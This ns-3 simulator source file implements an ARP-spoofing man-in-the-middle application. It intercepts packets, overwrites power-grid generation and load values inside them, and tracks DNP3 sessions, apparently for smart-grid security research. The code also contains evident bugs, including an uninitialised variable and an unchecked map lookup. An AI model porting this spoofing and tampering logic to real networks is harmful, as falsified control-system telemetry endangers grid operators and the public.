/*
 * arp-spoofing.cc
 *
 *  Created on: Mar. 19, 2019
 *
 *   Copyright (c) 2019 Chamara Devanarayana <chamara@rtds.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */
#include "attack-app.h"
#include "ns3/tcp-socket-base.h"
#include <vector>
#include <sys/socket.h>
#include <arpa/inet.h>
#include<cstdlib>
#include<list>
#include<array>
#include<string>
#include<iostream>
#include "ns3/tcp-option.h"
#include <bits/stdc++.h>




using namespace ns3;
using namespace std;


NS_LOG_COMPONENT_DEFINE ("AttackApp");

NS_OBJECT_ENSURE_REGISTERED (AttackApp);

typedef struct _configuration
  {
	  dnp3_config_t dnp3;
  }configuration;

TypeId
AttackApp::GetTypeId (void)
{
  static TypeId tid = TypeId ("ns3::AttackApp")
    .SetParent<Application> ()
    .SetGroupName("Applications")
    .AddConstructor<AttackApp> ()


  ;
  return tid;
}



AttackApp::AttackApp ()
  :m_node(),
  m_device(),
  m_iface(),
  m_fakeAddr(),
  m_vAddr(),
  m_vMac(),
  m_sendEvent (),
  m_running (false)
{
	NS_LOG_FUNCTION (this);
}

AttackApp::~AttackApp()
{
}

void
AttackApp::Setup (Ptr<Node> aNode, Ptr<NetDevice> aDev, Ptr<Ipv4Interface> iface, Ipv4Address addr, Ipv4Address vAddr, Address vMac)
{
  m_node = aNode;
  m_device = aDev;
  m_iface = iface;
  m_fakeAddr = addr;
  m_vAddr = vAddr;
  m_vMac = vMac;
  Ptr<ArpL3Protocol> arpProtocol = m_node->GetObject<ArpL3Protocol>();
  arpProtocol->EnableDisableSpoofedARP(true);
  multimap< string , int> mp;
}

void
AttackApp::StartApplication (void)
{
  // initialize the attacker
  m_attacker.SetNode(m_node);
  m_attacker.SetTrafficControl(m_node->GetObject<TrafficControlLayer> ());
  m_arpCache = m_attacker.CreateCache(m_device, m_iface);
  m_running = true;
  m_device->SetReceiveCallback(MakeCallback(&AttackApp::NonPromiscReceiveFromDevice,this));

//  Ptr<Ipv4> ipv4_n2 = m_node->GetObject<Ipv4>();
//
//  Ptr<Icmpv4L4Protocol> icmpv4 =ipv4_n2->GetObject<Icmpv4L4Protocol> ();
//
//
//      Ptr<NetDevice> oif =m_device; //specify non-zero if bound to a source address
//  Ipv4Header reverseIpHeader;
//  	reverseIpHeader.SetSource(Ipv4Address ("10.1.7.1"));
//      reverseIpHeader.SetDestination(Ipv4Address ("172.24.2.144"));
//      unsigned char buffer[8]={'a','e','i','o','u'};
//      Ptr<Packet> dummyPacket = Create<Packet>(buffer,6);
//      dummyPacket->AddHeader(reverseIpHeader);
//     // route = m_routingProtocol->RouteOutput(dummyPacket, reverseIpHeader, oif, errno_);
//  icmpv4->SendRedirection(dummyPacket, Ipv4Address ("10.1.5.2"), Ipv4Address ("10.1.5.1"),Ipv4Address ("10.1.5.2"), Ipv4Address ("172.24.2.144"), oif->GetAddress());

  //SendPacket();
}

void
AttackApp::StopApplication (void)
{
  m_running = false;

  if (m_sendEvent.IsRunning ())
    {
      Simulator::Cancel (m_sendEvent);
    }
}

void
AttackApp::SendPacket (void)
{
  m_attacker.SendArpReply(m_arpCache, m_fakeAddr, m_vAddr, m_vMac);
  std::cout << "stucked here" << std::endl;
  ScheduleTx ();
}

void
AttackApp::ScheduleTx (void)
{
  if (m_running)
    {
      Time tNext (MilliSeconds(1000));
      m_sendEvent = Simulator::Schedule (tNext, &AttackApp::SendPacket,this);
    }
}

bool AttackApp::NonPromiscReceiveFromDevice (Ptr<NetDevice> device, Ptr<const Packet> packet, uint16_t protocol,
                                   const Address &from)
{
  NS_LOG_FUNCTION (this << device << packet << protocol << &from);
  packet->Print(std::cout);
  return ReceiveFromDevice (device, packet, protocol, from, device->GetAddress (), NetDevice::PacketType (0), false);
}

int readConfigFile( configuration * config)
{
	//this function reads the config file at attack-app setup and stores the data in config
	std::ifstream infile("/etc/ns3/ns3.conf");
	std::string line, linePrev;
	int protocolNum = 0, readNewProtocol=0, indexNum=0;

	while (std::getline(infile, line))
	{
	    if((!readNewProtocol && line.find("dnp3",0)) || (readNewProtocol && linePrev.find("dnp3",0)))
	    {
	    	if(readNewProtocol)
	    	{
	    		readNewProtocol=0;
	    	}
	    	while (std::getline(infile, line))
	    	{
	    		if(line.find("protocol",0))
	    			{
	    			readNewProtocol++;
	    			linePrev = line;
	    			indexNum=0;
	    			break;
	    			}
	    		std::istringstream iss(line);
	    		int parameter = 0;
	    		for(std::string s; iss >> s; )
	    		{
	    			switch(parameter)
	    			{
	    			case 0:
	    				config->dnp3.values_to_alter[indexNum].func_code = stoi(s,nullptr,10);
	    				parameter++;
	    				break;
	    			case 1:
	    				config->dnp3.values_to_alter[indexNum].obj_group = stoi(s,nullptr,10);
	    				parameter++;
	    			    break;
	    			case 2:
						config->dnp3.values_to_alter[indexNum].obj_var = stoi(s,nullptr,10);
						parameter++;
						break;

	    			case 3: config->dnp3.values_to_alter[indexNum].identifier = stol(s,nullptr,10);
	    			parameter++;
	    			        break;
	    			case 4:
	    				if((config->dnp3.values_to_alter[indexNum].obj_group)==1 || (config->dnp3.values_to_alter[indexNum]).obj_group==10)
	    				{
	    					(config->dnp3.values_to_alter[indexNum]).integer_value =stol(s,nullptr,10);

	    				}
	    				else
	    				{
	    					(config->dnp3.values_to_alter[indexNum]).floating_point_val =stof(s,nullptr);
	    				}
	    				parameter++;
	    				break;
	    			default:
	    				break;
	    			}

	    		}
	    		indexNum++;

	    	}
	    }


	}



return 0;
}

vector<string> AttackApp::giveParsingString(int msgType)
{


	if(msgType <=3)
	{
		vector<string> parseString = {"int","int","float","float","end"};
//		vector<string>::iterator it = parseString.begin();
//		while(it!=parseString.end())
//		{
//			printf("%s",it);
//			it++;
//		}
//		const char *parseStr[] = {"int","int","float","float","end"};
//		char **string =(char **) malloc(5*sizeof(*string));
//		for(int i=0;i<5;i++)
//		{
//			string[i] = (char *)malloc(6*sizeof(*string[i]));
//			strcpy(string[i],parseStr[i]);
//		}
//
//
//
//		//std::printf("%s",*string);
		return parseString;

	}
	else
	{


		vector<string> parseString = {"int","int","int","float","float","float","float","end"};
//				char **string =(char **)malloc((sizeof(*string)*8));
//				for(int i=0;i<8;i++)
//				{
//					string[i] = (char *)malloc(sizeof(char)*6);
//					strcpy(string[i],parseStr[i]);
//					//std::printf("%s\n",string[i]);
//				}


				//std::printf("%s",*string);
				return parseString ;
	}




}

bool
AttackApp::ReceiveFromDevice (Ptr<NetDevice> device, Ptr<const Packet> packet, uint16_t protocol,
                         const Address &from, const Address &to, NetDevice::PacketType packetType, bool promiscuous)
{
  NS_LOG_FUNCTION (this << device << packet << protocol << &from << &to << packetType << promiscuous);
  NS_ASSERT_MSG (Simulator::GetContext () == m_node->GetId (), "Received packet with erroneous context ; " <<
                 "make sure the channels in use are correctly updating events context " <<
                 "when transferring events from one node to another.");
  NS_LOG_DEBUG ("Node " << m_node->GetId () << " ReceiveFromDevice:  dev "
                        << device->GetIfIndex () << " (type=" << device->GetInstanceTypeId ().GetName ()
                        << ") Packet UID " << packet->GetUid ());
  //modifiying the packet content
  Ptr<Packet> packetNew;

  Ipv4Header ipV4Hdr;
  UdpHeader udpHdr;
  TcpHeader tcpHdr;
  TcpHeader tcpHdr1;
  Ptr<Packet> packetCopy= packet->Copy();
  int lengthOfData;
  packetCopy->RemoveHeader (ipV4Hdr);
  int ipProtocol = ipV4Hdr.GetProtocol();

  if(protocol == 2048) {

  //only if UDP comment out if raw sockets or TCP sockets are used


 if(ipProtocol==17)
 {
         UdpHeader udpHdr1;
  		 packetCopy->RemoveHeader (udpHdr1);

  		 udpHdr.InitializeChecksum(ipV4Hdr.GetSource(),ipV4Hdr.GetDestination(),17);
  		 udpHdr.SetDestinationPort(udpHdr1.GetSourcePort());
  		 udpHdr.SetSourcePort(udpHdr1.GetDestinationPort());

 }
 else if (ipProtocol==6)
 {

	 packetCopy->RemoveHeader(tcpHdr1);
	 typedef std::list< Ptr<const TcpOption> > TcpOptionList; //!< List of TcpOption
	 tcpHdr.InitializeChecksum(ipV4Hdr.GetSource(),ipV4Hdr.GetDestination(),6);
	 tcpHdr.SetDestinationPort(tcpHdr1.GetDestinationPort());
	 tcpHdr.SetSourcePort(tcpHdr1.GetSourcePort());
	 tcpHdr.SetSequenceNumber(tcpHdr1.GetSequenceNumber());
	 tcpHdr.SetAckNumber(tcpHdr1.GetAckNumber());
	 tcpHdr.SetWindowSize(tcpHdr1.GetWindowSize());
	 tcpHdr.SetFlags(tcpHdr1.GetFlags());
	 std::list< Ptr<const TcpOption> > optionList = tcpHdr1.GetOptionList();
	 TcpOptionList::const_iterator i;
	 for (i = optionList.begin (); i != optionList.end (); ++i)
	     {
		 tcpHdr.AppendOption(*i);
	     }

	 lengthOfData = ipV4Hdr.GetPayloadSize()-tcpHdr1.GetLength()*4;
	 printf("Payload Length : %d", lengthOfData);







 }
//************************************************************************

 // }

if(ipProtocol == 6 && (lengthOfData>0) && (tcpHdr1.GetDestinationPort()!=20000 && tcpHdr1.GetSourcePort()!=20000))
{

	unsigned char buffer[packetCopy->GetSize ()] ;
	//if(packetCopy->GetSize ()>0){

	  	       unsigned int bufferFloat[packetCopy->GetSize ()];
	  	       packetCopy->CopyData (buffer, packetCopy->GetSize ());
	  	       int integerData;
	  	       int DERIndex ;
	  	       float floatingPointData;
	  	       memcpy(&bufferFloat, &buffer[0], packetCopy->GetSize ());


	  	       bufferFloat[0] = ntohl(bufferFloat[0]);
	  	       bufferFloat[1] = ntohl(bufferFloat[1]);
	  	       DERIndex=bufferFloat[1];

	  	       printf("msgType = %d\n", bufferFloat[0]);

	  	       //Ptr<Packet> copy = packet->Copy ();
	  	       //Ipv4Header iph;
	  	       //copy->RemoveHeader (iph);
	  	       //Ipv4Address destAddr = iph.GetDestination();

	  	       //int numbTx = txSocketn0->Send(packet);

	  	       //std::printf("Float as int:  %x\n",bufferFloat[1]);
	  	       //std::printf("Float as float: %f\n",floatingPointData);
	  	       integerData =  bufferFloat[0];
               vector<string> parseString = giveParsingString(integerData);
               vector<string>::iterator it = parseString.begin();
	  	       int i=0;
	  	       if(Simulator::Now ().GetSeconds ()>0.0)
	  	       {

	  	       while(it!=parseString.end() )
	  	       {
	  	    	   //printf("dataType = %s\n", string[i]);
	  	    	   if(it->compare("float")==0 && DERIndex != 1)
	  	    	   {




	  	    		   bufferFloat[i] = ntohl(bufferFloat[i]);
	  	    		   memcpy(&floatingPointData, &bufferFloat[i], 4);
	  	    		 printf("dataValue = %f-%d\n", floatingPointData,i);
	  	    		   if(integerData==7){

	  	    			   if(i==3){
	  	    				   floatingPointData = 3.0; //PGen
	  	    			   }
	  	    			   else if(i==4)
	  	    				   floatingPointData = 3.0; //QGen

	  	    			   else if(i==5){
	  	    				   floatingPointData = 4.5; //Pload
	  	    			   }
	  	    			   else
	  	    				   floatingPointData = 4.0; //Qload
	  	    		   }

	  	    		   else
	  	    		   {
	  	    			   if(i==3){
	  	    				   floatingPointData = 0.0;
	  	    			   }
	  	    			   else if(i==4)
	  	    				   floatingPointData = 0.0;

	  	    			   else if(i==5){
	  	    				   floatingPointData = 0.0;
	  	    			   }
	  	    			   else
	  	    				   floatingPointData = 0.0;

	  	    		   }
	  	    		   memcpy(&bufferFloat[i], &floatingPointData, 4);
	  	    		 printf("dataValueAfter = %f\n", floatingPointData);
	  	    		   bufferFloat[i] = htonl(bufferFloat[i]);
	  	    	   }
	  	    	   i++;
	  	    	   it++;
	  	       }
	  	       }
	  	       bufferFloat[0] = htonl(bufferFloat[0]);
	  	       bufferFloat[1] = htonl(bufferFloat[1]);
	  	       memcpy(&buffer, &bufferFloat, (unsigned long int)packetCopy->GetSize ());
    packetNew = Create<Packet>(buffer,packetCopy->GetSize ());

	tcpHdr.EnableChecksums();
	packetNew->AddHeader(tcpHdr);
	printf("Flags %x OrgLength: %d NewLength: %d Packet size: %d\n",tcpHdr.GetFlags()&TcpHeader::SYN,tcpHdr1.GetLength(),tcpHdr.GetLength(),packetCopy->GetSize ());
	if(tcpHdr1.IsChecksumOk() && ipV4Hdr.IsChecksumOk())
		printf("Checksum ok\n");
	else
		printf("Checksum error");
	 ipV4Hdr.SetPayloadSize(packetNew->GetSize());
	 ipV4Hdr.EnableChecksum();
     packetNew->AddHeader(ipV4Hdr);
}


else if(ipProtocol == 6 && (lengthOfData>0) && (tcpHdr1.GetDestinationPort()==20000 || tcpHdr1.GetSourcePort()==20000))
{
	Ipv4Address senderIp;
	uint32_t senderIntIP;
	uint64_t key;
	unsigned short int dataSize = packetCopy->GetSize ();
	unsigned char buffer[dataSize] ;
		//if(packetCopy->GetSize ()>0){


	packetCopy->CopyData (buffer, dataSize);

	if (tcpHdr1.GetDestinationPort()==20000)
	{
		senderIp = ipV4Hdr.GetSource();
		senderIntIP = senderIp;
		key = senderIntIP<<16 + tcpHdr1.GetSourcePort();
		dnp3_session_data_t* session = mmapOfdnp3Data.find(key)->second;
		if(session)
		{
			DNP3FullReassembly(&configDnp3, session, packet, (char *)buffer,dataSize);
		}
		else
		{
			 session  =  new dnp3_session_data_t();
			 mmapOfdnp3Data.insert({key, session});
			 DNP3FullReassembly(&configDnp3, session, packet, (char *)buffer,dataSize);
		}
	}
}

//else if(ipProtocol == 6 && (lengthOfData>0) && (tcpHdr1.GetDestinationPort()!=20000 && tcpHdr1.GetSourcePort()!=20000))
//{
//	unsigned char buffer[packetCopy->GetSize ()] ;
//	packetCopy->CopyData (buffer, packetCopy->GetSize ());
//	dnp3Header header;
//	memcpy(&header.astart,&buffer[0],2);
//	memcpy(&header.aLen,&buffer[2],1);
//	memcpy(&header.aCtrl,&buffer[3],1);
//	memcpy(&header.aDest,&buffer[4],2);
//	memcpy(&header.aSrc,&buffer[6],2);
//	memcpy(&header.aCrc,&buffer[8],2);
//
//	header.astart = ntohs(header.astart);
//	header.aDest = ntohs(header.aDest);
//	header.aSrc = ntohs(header.aSrc);
//	header.aCrc = ntohs(header.aCrc);
//	bool firstFrame = false;
//
//	uint8_t  th = buffer[10];
//	if(th & FIR_MASK)
//	{
//		firstFrame = true;
//
//	}
//
//}
//else if (ipProtocol == 6 && (tcpHdr1.GetFlags()& TcpHeader::PSH !=8))
//{
//	packetNew = Create<Packet>();
//	//packetNew = packetCopy->Copy();
//	tcpHdr.EnableChecksums();
//	packetNew->AddHeader(tcpHdr);
//	printf("Flags %x OrgLength: %d NewLength: %d Packet size: %d\n",tcpHdr.GetFlags()&TcpHeader::SYN,tcpHdr1.GetLength(),tcpHdr.GetLength(),packetCopy->GetSize ());
//	if(tcpHdr1.IsChecksumOk() && ipV4Hdr.IsChecksumOk())
//		printf("Checksum ok\n");
//	else
//		printf("Checksum error");
//}



  	    //only if UDP comment out if raw sockets or TCP sockets are used
if(ipProtocol == 17){

	unsigned char buffer[packetCopy->GetSize ()] ;
	//if(packetCopy->GetSize ()>0){

	unsigned int bufferFloat[packetCopy->GetSize ()];
	packetCopy->CopyData (buffer, packetCopy->GetSize ());
	int integerData;
	int DERIndex ;

	float floatingPointData;
	memcpy(&bufferFloat, &buffer[0], packetCopy->GetSize ());


	bufferFloat[0] = ntohl(bufferFloat[0]);
	bufferFloat[1] = ntohl(bufferFloat[1]);
	printf("msgType = %d\n", bufferFloat[0]);


	DERIndex=bufferFloat[1];

	//Ptr<Packet> copy = packet->Copy ();
	//Ipv4Header iph;
	//copy->RemoveHeader (iph);
	//Ipv4Address destAddr = iph.GetDestination();

	//int numbTx = txSocketn0->Send(packet);

	//std::printf("Float as int:  %x\n",bufferFloat[1]);
	//std::printf("Float as float: %f\n",floatingPointData);
	integerData =  bufferFloat[0];
	 vector<string> parseString = giveParsingString(integerData);
	 vector<string>::iterator it = parseString.begin();
	int i=0;
	if(Simulator::Now ().GetSeconds ()>0.0)
	{
		while(it!=parseString.end() && DERIndex != 1)
		{
			//printf("dataType = %s\n", string[i]);
			if(it->compare("float")==0)
			{

		      		bufferFloat[i] = ntohl(bufferFloat[i]);
				memcpy(&floatingPointData, &bufferFloat[i], 4);
				printf("dataValue = %f-%d\n", floatingPointData,i);
				if(integerData==7){

					if(i==3){
						floatingPointData = 3.0; //PGen
					}
					else if(i==4)
						floatingPointData = 3.0; //QGen

					else if(i==5){
						floatingPointData = 4.5; //Pload
					}
					else
						floatingPointData = 4.0; //Qload
				}

				else
				{
					if(i==3){
						floatingPointData = 0.0;
					}
					else if(i==4)
						floatingPointData = 0.0;

					else if(i==5){
						floatingPointData = 0.0;
					}
					else
						floatingPointData = 0.0;

				}
				memcpy(&bufferFloat[i], &floatingPointData, 4);
				printf("dataValueAfter = %f\n", floatingPointData);
				bufferFloat[i] = htonl(bufferFloat[i]);
			}
			i++;

			it++;
		}
	}
	bufferFloat[0] = htonl(bufferFloat[0]);
	bufferFloat[1] = htonl(bufferFloat[1]);
	memcpy(&buffer, &bufferFloat, packetCopy->GetSize ());
	packetNew = Create<Packet>(buffer,packetCopy->GetSize ());
	udpHdr.EnableChecksums();
	packetNew->AddHeader(udpHdr);
	if(udpHdr.IsChecksumOk() && ipV4Hdr.IsChecksumOk())
		printf("Checksum ok\n");
	else
		printf("Checksum error");
	//*****************************************************
	 ipV4Hdr.SetPayloadSize(packetNew->GetSize());
	 ipV4Hdr.EnableChecksum();
	 packetNew->AddHeader(ipV4Hdr);
}

//  	    if(ipProtocol == 6){
//
//  	     	     tcpHdr.EnableChecksums();
//  	     	     packetNew->AddHeader(tcpHdr);
//  	     	     printf("Flags %x OrgLength: %d NewLength: %d Packet size: %d\n",tcpHdr.GetFlags()&TcpHeader::SYN,tcpHdr1.GetLength(),tcpHdr.GetLength(),packetCopy->GetSize ());
//  	     	     if(tcpHdr1.IsChecksumOk() && ipV4Hdr.IsChecksumOk())
//  	     	     	  	    	 printf("Checksum ok\n");
//  	     	     	 else
//  	     	     				 printf("Checksum error");
//  	     	     //*****************************************************
//  	     	      }


  	       //end of modification

  }


  bool found = false;
  std::vector< Node::ProtocolHandlerEntry> protocolList = m_node->GetProtocolHandlerList();

  for (Node::ProtocolHandlerList::iterator i = protocolList.begin ();
       i != protocolList.end (); i++)
    {
      if (i->device == 0 ||
          (i->device != 0 && i->device == device))
        {
          if (i->protocol == 0 ||
              i->protocol == protocol)
            {
              if (promiscuous == i->promiscuous)
                {
            	  if(protocol == 2048 && ((ipProtocol == 6 && (lengthOfData>0))||ipProtocol == 17))
            	  {
            		  i->handler (device, packetNew, protocol, from, to, packetType);
            	  }
            	  else
            	  {
            		  i->handler (device, packet, protocol, from, to, packetType);
            	  }

                  found = true;
                  printf("Found\n");
                }
            }
        }
    }
  return found;
}





